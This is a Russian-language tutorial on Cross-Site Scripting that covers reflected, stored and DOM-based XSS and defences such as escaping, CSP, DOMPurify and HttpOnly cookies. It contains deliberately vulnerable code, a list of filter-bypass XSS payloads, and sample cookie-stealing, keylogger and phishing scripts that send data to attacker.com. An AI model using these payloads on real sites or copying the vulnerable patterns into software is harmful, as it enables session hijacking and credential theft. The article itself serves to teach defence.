---
title: "XSS атаки: Как защитить веб-приложение от инъекций"
description: "Полное руководство по Cross-Site Scripting (XSS) атакам. Типы XSS, примеры эксплуатации и методы защиты."
publishedAt: 2024-03-20
tags: ["security", "xss", "frontend"]
---

Cross-Site Scripting (XSS) — одна из самых распространённых веб-уязвимостей. По данным OWASP, XSS находится в топ-10 критических угроз веб-безопасности.

## Что такое XSS?

XSS позволяет атакующему внедрить вредоносный JavaScript в веб-страницу, который выполнится в браузере жертвы.

**Последствия XSS:**
- Кража cookies и токенов аутентификации
- Захват сессий пользователей
- Фишинг (поддельные формы входа)
- Изменение содержимого страницы
- Выполнение действий от имени пользователя

## Типы XSS

### 1. Reflected XSS (Отражённый)

Вредоносный код приходит из HTTP-запроса и сразу отображается на странице.

```javascript
// ❌ Уязвимый код
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Атака:
// GET /search?q=<script>alert('XSS')</script>
// Результат: <h1>Results for: <script>alert('XSS')</script></h1>
```

### 2. Stored XSS (Хранимый)

Вредоносный код сохраняется в БД и отображается всем пользователям.

```javascript
// ❌ Уязвимый код
app.post('/comment', (req, res) => {
  const comment = req.body.text;
  db.save({ text: comment }); // Сохраняем без санитизации
});

// При отображении:
comments.forEach(c => {
  html += `<p>${c.text}</p>`; // XSS!
});

// Атакующий отправляет:
// { text: "<img src=x onerror='alert(document.cookie)'>" }
```

### 3. DOM-based XSS

Уязвимость полностью на клиенте, без участия сервера.

```javascript
// ❌ Уязвимый код
const search = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').innerHTML = search;

// Атака:
// https://site.com/?q=<img src=x onerror=alert(1)>
```

## Примеры эксплуатации

### Кража cookies

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### Keylogger

```html
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

### Фишинговая форма

```html
<script>
  document.body.innerHTML = `
    <h1>Сессия истекла</h1>
    <form action="https://attacker.com/phish">
      <input name="password" placeholder="Введите пароль">
      <button>Войти</button>
    </form>
  `;
</script>
```

## Защита от XSS

### 1. Экранирование вывода

```javascript
// ✅ Безопасно: экранируем HTML
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});
```

### 2. Используйте textContent вместо innerHTML

```javascript
// ❌ Уязвимо
element.innerHTML = userInput;

// ✅ Безопасно
element.textContent = userInput;
```

### 3. React автоматически экранирует

```tsx
// ✅ Безопасно: React экранирует по умолчанию
const Comment = ({ text }) => {
  return <p>{text}</p>; // Автоматическое экранирование
};

// ❌ Опасно: dangerouslySetInnerHTML отключает защиту
const UnsafeComment = ({ html }) => {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
};
```

### 4. Content Security Policy (CSP)

Заголовок CSP запрещает выполнение инлайн-скриптов.

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'nonce-random123'"
  );
  next();
});
```

```html
<!-- Только скрипты с правильным nonce выполнятся -->
<script nonce="random123">
  // Этот скрипт выполнится
</script>

<script>
  // Этот скрипт будет заблокирован
</script>
```

### 5. Валидация и санитизация

```javascript
import DOMPurify from 'dompurify';

// ✅ Безопасно: очищаем HTML
const cleanHtml = DOMPurify.sanitize(userInput);
element.innerHTML = cleanHtml;
```

### 6. HttpOnly cookies

```javascript
// ✅ Cookie недоступна для JavaScript
res.cookie('session', token, {
  httpOnly: true,  // Защита от XSS
  secure: true,    // Только HTTPS
  sameSite: 'strict'
});
```

## Проверка на XSS

### Тестовые payloads

```html
<!-- Базовый -->
<script>alert('XSS')</script>

<!-- Обход фильтров -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- Encoded -->
<script>alert(String.fromCharCode(88,83,83))</script>
```

## Реальный пример: Безопасный комментарий

```typescript
// Backend: валидация и экранирование
import { body, validationResult } from 'express-validator';
import DOMPurify from 'isomorphic-dompurify';

app.post('/comment',
  body('text').trim().isLength({ min: 1, max: 500 }),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Санитизация HTML
    const cleanText = DOMPurify.sanitize(req.body.text, {
      ALLOWED_TAGS: [], // Запрещаем все HTML-теги
      ALLOWED_ATTR: []
    });
    
    await db.comments.create({ text: cleanText });
    res.json({ success: true });
  }
);

// Frontend: React (автоматическое экранирование)
const Comment = ({ text, author }: CommentProps) => {
  return (
    <div className="comment">
      <strong>{author}</strong>
      <p>{text}</p> {/* React экранирует автоматически */}
    </div>
  );
};
```

## Checklist защиты от XSS

- ✅ Экранируйте весь пользовательский ввод при выводе
- ✅ Используйте `textContent` вместо `innerHTML`
- ✅ Валидируйте ввод на стороне сервера
- ✅ Применяйте Content Security Policy (CSP)
- ✅ Делайте cookies `HttpOnly` и `Secure`
- ✅ Используйте библиотеки санитизации (DOMPurify)
- ✅ Избегайте `eval()`, `Function()`, `setTimeout(string)`
- ✅ Регулярно обновляйте зависимости
- ✅ Проводите security аудиты

## Инструменты для тестирования

1. **Burp Suite** — перехват и модификация запросов
2. **OWASP ZAP** — автоматическое сканирование XSS
3. **XSStrike** — инструмент для поиска XSS
4. **Browser DevTools** — проверка CSP заголовков

## Дополнительные меры

```javascript
// X-XSS-Protection (устаревший, но можно добавить)
res.setHeader('X-XSS-Protection', '1; mode=block');

// X-Content-Type-Options
res.setHeader('X-Content-Type-Options', 'nosniff');

// X-Frame-Options (защита от clickjacking)
res.setHeader('X-Frame-Options', 'DENY');
```

## Ключевые моменты

1. **Никогда не доверяйте пользовательскому вводу**
2. **Экранируйте всё** при выводе на страницу
3. **CSP** — ваш лучший друг
4. **HttpOnly cookies** защищают токены
5. **Валидация** на клиенте и сервере
6. **Sanitize** HTML перед сохранением
7. **Тестируйте** на XSS регулярно

XSS — серьёзная угроза, но с правильным подходом её можно полностью предотвратить! 🛡️
